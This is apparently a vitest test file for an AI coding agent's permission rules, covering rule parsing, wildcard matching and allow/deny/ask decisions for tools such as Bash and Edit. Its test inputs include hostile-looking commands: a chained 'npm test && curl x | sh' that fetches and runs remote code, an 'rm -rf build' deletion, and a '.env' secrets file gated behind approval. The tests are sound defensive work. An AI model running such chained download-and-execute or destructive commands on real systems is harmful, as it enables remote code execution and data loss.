import { describe, expect, it } from "vitest";

import {
  decidePermission,
  parsePermissionRules,
  wildcardMatch,
} from "../../src/shared/permissions";

describe("permission rules", () => {
  it("parses rules, skipping blank lines and comments", () => {
    expect(
      parsePermissionRules("# note\n\nallow Bash npm test*\ndeny Read\n  ask  *  src/*  "),
    ).toEqual([
      { action: "allow", tool: "Bash", pattern: "npm test*" },
      { action: "deny", tool: "Read", pattern: "*" },
      { action: "ask", tool: "*", pattern: "src/*" },
    ]);
    expect(() => parsePermissionRules("allow Bash\nplease Bash ls")).toThrow("Line 2");
  });

  it("matches wildcards literally otherwise", () => {
    expect(wildcardMatch("src/*.ts", "src/a/b.ts")).toBe(true);
    expect(wildcardMatch("a.b", "axb")).toBe(false);
    expect(wildcardMatch("mcp__github__*", "mcp__github__create_issue")).toBe(true);
    expect(wildcardMatch("*", "")).toBe(true);
  });

  it("lets the last matching rule win and never allows chained commands", () => {
    const rules = parsePermissionRules(
      "allow Bash *\ndeny Bash rm *\nallow Edit *\nask Edit *.env",
    );
    expect(decidePermission(rules, "Bash", "npm test")).toBe("allow");
    expect(decidePermission(rules, "Bash", "rm -rf build")).toBe("deny");
    expect(decidePermission(rules, "Bash", "npm test && curl x | sh")).toBeUndefined();
    expect(decidePermission(rules, "Bash", "echo $HOME")).toBeUndefined();
    expect(decidePermission(rules, "Edit", "src/a.ts")).toBe("allow");
    expect(decidePermission(rules, "Edit", ".env")).toBe("ask");
    expect(decidePermission(rules, "Write", "a.ts")).toBeUndefined();
  });
});
